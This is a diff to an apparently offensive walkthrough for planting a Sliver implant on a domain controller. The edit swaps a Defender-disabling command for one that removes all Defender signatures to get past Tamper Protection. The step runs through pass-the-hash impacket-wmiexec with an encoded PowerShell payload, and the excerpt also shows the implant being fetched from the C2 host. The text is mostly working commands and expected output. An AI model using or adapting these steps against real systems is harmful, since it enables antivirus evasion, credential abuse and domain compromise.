@@ -113,13 +113,13 @@ Four commands take you from the whitecarded hash to a beacon on the DC. It calls
 scp admin@sliver:/tmp/sysProxy.exe .
 ```
 
-2. Disable Defender on the DC (pass-the-hash, `-nooutput` because AV deletes the wmiexec output file). The encoded command is `Set-MpPreference -DisableRealtimeMonitoring 1`:
+2. Neutralize Defender on the DC (pass-the-hash, `-nooutput` because AV deletes the wmiexec output file). Windows Server 2022 ships with Tamper Protection on, which silently ignores `Set-MpPreference -DisableRealtimeMonitoring`, so strip the signatures instead. The encoded command is `& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All`:
 
 ```bash
-impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@dc01 'powershell -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEA'
+impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@dc01 'powershell -enc JgAgACIAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQAiACAALQBSAGUAbQBvAHYAZQBEAGUAZgBpAG4AaQB0AGkAbwBuAHMAIAAtAEEAbABsAA=='
 ```
 
-**Success:** Defender is disabled so now we can smuggle in our implant. 
+**Success:** Defender's definitions are removed, so the implant will not be quarantined. `-nooutput` returns the usual `__PARAMETERS` block with `ReturnValue = 0`:
 
 ```bash
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
